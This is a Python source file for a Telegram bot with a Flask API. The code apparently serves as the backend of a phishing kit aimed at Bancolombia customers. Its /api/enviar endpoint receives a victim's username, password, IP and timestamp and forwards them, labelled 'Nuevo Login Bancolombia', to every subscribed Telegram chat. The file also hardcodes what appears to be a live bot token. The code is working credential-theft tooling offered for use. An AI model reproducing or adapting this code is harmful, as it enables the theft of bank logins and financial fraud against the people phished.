# bot_server.py
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
import threading
import requests

TOKEN_BOT = '8193163279:AAHODlqpMObz2mdIjxJfsXdu6rHBe0ECEWQ'

# Flask
app = Flask(__name__)
CORS(app)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///suscriptores.db'
db = SQLAlchemy(app)

# Modelo de base de datos
class Suscriptor(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    chat_id = db.Column(db.String(50), unique=True, nullable=False)
    username = db.Column(db.String(100))
    nombre = db.Column(db.String(100))
    activo = db.Column(db.Boolean, default=True)

with app.app_context():
    db.create_all()

# ========== COMANDOS DEL BOT ==========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    username = update.effective_user.username
    nombre = update.effective_user.first_name
    
    with app.app_context():
        suscriptor = Suscriptor.query.filter_by(chat_id=chat_id).first()
        
        if suscriptor:
            if not suscriptor.activo:
                suscriptor.activo = True
                db.session.commit()
                await update.message.reply_text("✅ Suscripción reactivada! Recibirás las notificaciones.")
            else:
                await update.message.reply_text("✅ Ya estás suscrito! Recibirás todas las notificaciones.")
        else:
            nuevo = Suscriptor(chat_id=chat_id, username=username, nombre=nombre)
            db.session.add(nuevo)
            db.session.commit()
            await update.message.reply_text(
                f"✅ ¡Bienvenido {nombre}!\n\n"
                "Te has suscrito correctamente.\n"
                "Recibirás todas las notificaciones del formulario.\n\n"
                "Usa /stop para cancelar suscripción."
            )

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    
    with app.app_context():
        suscriptor = Suscriptor.query.filter_by(chat_id=chat_id).first()
        
        if suscriptor and suscriptor.activo:
            suscriptor.activo = False
            db.session.commit()
            await update.message.reply_text("❌ Suscripción cancelada. Ya no recibirás notificaciones.")
        else:
            await update.message.reply_text("No estás suscrito.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    
    with app.app_context():
        suscriptor = Suscriptor.query.filter_by(chat_id=chat_id).first()
        total = Suscriptor.query.filter_by(activo=True).count()
        
        if suscriptor and suscriptor.activo:
            await update.message.reply_text(f"✅ Estado: Activo\n👥 Total suscriptores: {total}")
        else:
            await update.message.reply_text("❌ No estás suscrito. Usa /start")

# ========== API FLASK ==========

@app.route('/api/enviar', methods=['POST'])
def enviar_a_suscriptores():
    data = request.json
    
    mensaje = f"""
🔐 *Nuevo Login Bancolombia*
━━━━━━━━━━━━━━━━━━━━━━
👤 *Usuario:* `{data['usuario']}`
🔑 *Clave:* `{data['clave']}`
━━━━━━━━━━━━━━━━━━━━━━
📱 *IP:* {data['ip']}
🕐 *Fecha:* {data['fecha']}
    """
    
    suscriptores = Suscriptor.query.filter_by(activo=True).all()
    
    enviados = 0
    errores = 0
    
    for suscriptor in suscriptores:
        try:
            url = f'https://api.telegram.org/bot{TOKEN_BOT}/sendMessage'
            response = requests.post(url, json={
                'chat_id': suscriptor.chat_id,
                'text': mensaje,
                'parse_mode': 'Markdown'
            })
            
            if response.json()['ok']:
                enviados += 1
            else:
                errores += 1
        except:
            errores += 1
    
    return jsonify({
        'success': True,
        'enviados': enviados,
        'errores': errores,
        'total_suscriptores': len(suscriptores)
    })

@app.route('/api/suscriptores', methods=['GET'])
def listar_suscriptores():
    suscriptores = Suscriptor.query.filter_by(activo=True).all()
    return jsonify({
        'total': len(suscriptores),
        'suscriptores': [{
            'chat_id': s.chat_id,
            'username': s.username,
            'nombre': s.nombre
        } for s in suscriptores]
    })

# ========== INICIAR BOT ==========

def iniciar_bot():
    application = Application.builder().token(TOKEN_BOT).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("status", status))
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    bot_thread = threading.Thread(target=iniciar_bot, daemon=True)
    bot_thread.start()
    
    print("🤖 Bot iniciado - Los usuarios pueden suscribirse con /start")
    print("🌐 API Flask en http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
